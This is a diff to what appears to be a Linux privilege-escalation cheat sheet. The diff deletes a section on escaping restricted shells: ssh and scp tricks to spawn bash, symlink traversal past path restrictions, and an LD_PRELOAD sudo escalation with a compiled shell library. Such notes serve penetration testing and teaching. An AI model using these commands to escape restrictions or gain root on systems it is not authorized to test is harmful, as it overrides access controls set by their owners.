@@ -224,30 +224,3 @@ lsblk -f
 mount | grep -E "nfs|bind"  # NFS
 cat /etc/fstab              # Persistant mounted point
 ```
-
-## 🚫 Bypass Restricted Shell (rbash, rssh)
-
-- [Bypass restricted shell](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
-
-```bash
-# Try standard commands
-ssh user@host -t "bash --noprofile"
-scp -S /path/to/bash user@host:file .
-```
-
-### Symlink traversal (bypass path restrictions)
-
-```bash
-ln -s / link
-cd link/etc # its like /etc, can be used for privesc (like bypass "../")
-
-find / -type l -exec readlink -f {} \; 2>/dev/null  | grep "/path/to/folder"
-```
-
-### LD_PRELOAD (sudo)
-
-```bash
-# if sudo -l print env_keep+=LD_PRELOAD
-gcc -shared -o shell.so -fPIC shell.c
-sudo LD_PRELOAD=./shell.so program
-```
